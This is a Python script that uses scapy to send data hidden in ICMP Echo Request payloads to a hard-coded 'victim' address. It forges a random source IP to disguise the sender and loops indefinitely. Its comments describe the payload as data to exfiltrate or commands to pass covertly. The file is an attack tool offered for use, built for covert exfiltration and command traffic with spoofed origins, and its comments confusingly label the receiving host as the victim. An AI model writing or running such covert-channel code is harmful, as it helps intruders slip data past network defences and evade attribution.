import scapy.all as scapy
import random
import time

# Function to send covert data in ICMP Echo Request packets
def send_icmp_covert_data(target_ip, data):
    try:
        # Generate a random source IP to disguise the attacker's identity
        src_ip = f"192.168.1.{random.randint(2, 254)}"

        # Create an ICMP Echo Request packet with the covert payload (data)
        icmp_request = scapy.ICMP()  # ICMP Echo Request
        ip_packet = scapy.IP(src=src_ip, dst=target_ip)  # Source and Destination IPs
        payload = data  # The covert data (commands, messages, etc.)

        # Send the packet with the embedded data as payload
        packet = ip_packet / icmp_request / payload
        scapy.send(packet, verbose=False)  # Send the packet
        print(f"Sent ICMP Echo Request with covert data: {data}")

    except Exception as e:
        print(f"Error sending ICMP packet: {e}")

# Main function to send covert data in ICMP Echo Request packets
def main():
    target_ip = "192.168.100.5"  # Victim's IP (replace with actual IP)
    covert_data = "Covert Channel Using ICMP: secret_data"  # The payload data you want to exfiltrate

    print("Starting covert communication using ICMP Echo Requests...")

    while True:
        send_icmp_covert_data(target_ip, covert_data)  # Continuously send data
        time.sleep(1)  # Sleep between sends to avoid overwhelming the network

if __name__ == "__main__":
    main()
